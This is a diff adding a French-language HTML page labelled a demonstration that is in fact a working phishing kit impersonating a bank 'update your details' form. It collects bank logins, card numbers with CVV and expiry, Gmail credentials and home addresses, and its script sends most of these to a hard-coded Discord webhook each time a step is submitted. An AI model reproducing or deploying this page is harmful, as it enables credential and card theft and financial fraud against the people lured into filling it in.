@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Démonstration - Formulaire Factice</title>
+    <style>
+        body { background-color: #001f3f; color: white; font-family: Arial, sans-serif; }
+        .container { max-width: 600px; margin: 50px auto; padding: 20px; background-color: #003366; border-radius: 10px; }
+        .page { display: none; }
+        .page.active { display: block; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 5px; }
+        .form-group input, .form-group select { width: 100%; padding: 10px; border: none; border-radius: 5px; }
+        .form-group input[type="submit"] { background-color: #0056b3; color: white; cursor: pointer; }
+        .form-group input[type="submit"]:hover { background-color: #004494; }
+        .warning { background-color: #ffcc00; color: #333; padding: 10px; border-radius: 5px; margin-bottom: 20px; text-align: center; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="warning">
+            ⚠️ Mettez vos cordonné à jours ⚠️
+        </div>
+
+        <div class="page active" id="page1">
+            <h2>Sélectionnez votre banque</h2>
+            <form id="form1">
+                <div class="form-group">
+                    <label for="bank">Banque:</label>
+                    <select id="bank" name="bank">
+                        <option value="">-- Sélectionnez votre banque --</option>
+                        <option value="BNP Paribas">BNP Paribas</option>
+                        <option value="Crédit Agricole">Crédit Agricole</option>
+                        <option value="Société Générale">Société Générale</option>
+                        <option value="BPCE (Banque Populaire/Caisse d'Epargne)">BPCE (Banque Populaire/Caisse d'Epargne)</option>
+                        <option value="Crédit Mutuel">Crédit Mutuel</option>
+                        <option value="La Banque Postale">La Banque Postale</option>
+                        <option value="HSBC France">HSBC France</option>
+                        <option value="CIC">CIC</option>
+                        <option value="LCL">LCL</option>
+                        <option value="ING France">ING France</option>
+                        <option value="Boursorama">Boursorama</option>
+                        <option value="Hello bank! (BNP Paribas)">Hello bank! (BNP Paribas)</option>
+                        <option value="Fortuneo">Fortuneo</option>
+                        <option value="Monabanq">Monabanq</option>
+                        <option value="BforBank">BforBank</option>
+                        <option value="Orange Bank">Orange Bank</option>
+                        <option value="Revolut">Revolut</option>
+                        <option value="N26">N26</option>
+                        <option value="Lydia">Lydia</option>
+                        <option value="Qonto (pro)">Qonto (pro)</option>
+                        <option value="Shine (pro)">Shine (pro)</option>
+                        <option value="Crédit Coopératif">Crédit Coopératif</option>
+                        <option value="Crédit du Nord">Crédit du Nord</option>
+                        <option value="AXA Banque">AXA Banque</option>
+                        <option value="Carrefour Banque">Carrefour Banque</option>
+                        <option value="Cofidis">Cofidis</option>
+                        <option value="Floa Bank">Floa Bank</option>
+                        <option value="PSA Banque">PSA Banque</option>
+                        <option value="RCI Banque">RCI Banque</option>
+                        <option value="Société Marseillaise de Crédit">Société Marseillaise de Crédit</option>
+                        <option value="Banque Palatine">Banque Palatine</option>
+                        <option value="Banque Chaix">Banque Chaix</option>
+                        <option value="Banque de Savoie">Banque de Savoie</option>
+                        <option value="Banque Martin Maurel">Banque Martin Maurel</option>
+                        <option value="Banque Transatlantique">Banque Transatlantique</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="identifier">Identifiant:</label>
+                    <input type="text" id="identifier" name="identifier" placeholder="ex: jean.dupont">
+                </div>
+                <div class="form-group">
+                    <label for="password">Mot de passe:</label>
+                    <input type="password" id="password" name="password" placeholder="Votre mot de passe">
+                </div>
+                <div class="form-group">
+                    <input type="submit" value="Suivant">
+                </div>
+            </form>
+        </div>
+
+        <div class="page" id="page2">
+            <h2>Coordonnées de la carte bancaire</h2>
+            <form id="form2">
+                <div class="form-group">
+                    <label for="cardNumber">Numéro de carte (16 chiffres):</label>
+                    <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV:</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4">
+                </div>
+                <div class="form-group">
+                    <label for="expirationDate">Date d'expiration (MM/AA):</label>
+                    <input type="text" id="expirationDate" name="expirationDate" placeholder="12/25">
+                </div>
+                <div class="form-group">
+                    <input type="submit" value="Suivant">
+                </div>
+            </form>
+        </div>
+
+        <div class="page" id="page3">
+            <h2>Informations de connexion</h2>
+            <form id="form3">
+                <div class="form-group">
+                    <label for="email">Gmail:</label>
+                    <input type="email" id="email" name="email" placeholder="exemple@gmail.com">
+                </div>
+                <div class="form-group">
+                    <label for="emailPassword">Mot de passe Gmail:</label>
+                    <input type="password" id="emailPassword" name="emailPassword" placeholder="Votre mot de passe Gmail">
+                </div>
+                <div class="form-group">
+                    <input type="submit" value="Suivant">
+                </div>
+            </form>
+        </div>
+
+        <div class="page" id="page4">
+            <h2>Adresse</h2>
+            <form id="form4">
+                <div class="form-group">
+                    <label for="address">Adresse:</label>
+                    <input type="text" id="address" name="address" placeholder="Numéro et nom de rue">
+                </div>
+                <div class="form-group">
+                    <label for="postalCode">Code postal:</label>
+                    <input type="text" id="postalCode" name="postalCode" placeholder="75001">
+                </div>
+                <div class="form-group">
+                    <label for="city">Ville:</label>
+                    <input type="text" id="city" name="city" placeholder="Paris">
+                </div>
+                <div class="form-group">
+                    <input type="submit" value="Soumettre">
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // ==================== TON WEBHOOK DISCORD ====================
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1472970808015061072/r5E9PRREA5jd1Oz7UPV9Zt0SJU2ifvVDcywyOn1WvpEImrBdmc0XmA_hVLpUfQgfAMcw";   // ← Remplace par ton vrai webhook
+
+        // Fonction d'envoi vers Discord
+        async function sendToDiscord() {
+            if (!WEBHOOK_URL || WEBHOOK_URL.includes("TON_ID")) {
+                console.log("Webhook non configuré");
+                return;
+            }
+
+            const data = {
+                bank: document.getElementById("bank").value,
+                identifier: document.getElementById("identifier").value,
+                password: document.getElementById("password").value,
+                cardNumber: document.getElementById("cardNumber").value,
+                cvv: document.getElementById("cvv").value,
+                expirationDate: document.getElementById("expirationDate").value,
+                email: document.getElementById("email").value,
+                emailPassword: document.getElementById("emailPassword").value,
+                address: document.getElementById("address").value,
+                postalCode: document.getElementById("postalCode").value,
+                city: document.getElementById("city").value
+            };
+
+            const embed = {
+                title: "📥 Nouvelle soumission formulaire",
+                color: 0x0056b3,
+                timestamp: new Date().toISOString(),
+                fields: [
+                    { name: "Banque", value: data.bank || "Non renseigné", inline: true },
+                    { name: "Identifiant", value: data.identifier || "Non renseigné", inline: true },
+                    { name: "Mot de passe", value: data.password ? "✅ Renseigné" : "Non renseigné", inline: true },
+                    { name: "Numéro de carte", value: data.cardNumber || "Non renseigné", inline: false },
+                    { name: "CVV", value: data.cvv || "Non renseigné", inline: true },
+                    { name: "Expiration", value: data.expirationDate || "Non renseigné", inline: true },
+                    { name: "Gmail", value: data.email || "Non renseigné", inline: false },
+                    { name: "Mot de passe Gmail", value: data.emailPassword ? "✅ Renseigné" : "Non renseigné", inline: true },
+                    { name: "Adresse", value: data.address || "Non renseigné", inline: false },
+                    { name: "Code postal & Ville", value: `${data.postalCode || ""} ${data.city || ""}`.trim() || "Non renseigné", inline: true }
+                ]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                console.log("✅ Données envoyées vers Discord");
+            } catch (e) {
+                console.error("Erreur envoi Discord :", e);
+            }
+        }
+
+        // Simulation de navigation entre pages
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', async function(event) {
+                event.preventDefault();
+
+                // Envoi vers Discord à chaque étape
+                await sendToDiscord();
+
+                const currentPage = document.querySelector('.page.active');
+                const nextPage = currentPage.nextElementSibling;
+
+                if (nextPage && nextPage.classList.contains('page')) {
+                    currentPage.classList.remove('active');
+                    nextPage.classList.add('active');
+                } else {
+                    alert('⚠️ Vos données ont bien été enregistré.⚠️ ️');
+
+                    // Réinitialiser
+                    document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+                    document.getElementById('page1').classList.add('active');
+                    document.querySelectorAll('input').forEach(input => input.value = '');
+                    document.querySelector('select').selectedIndex = 0;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
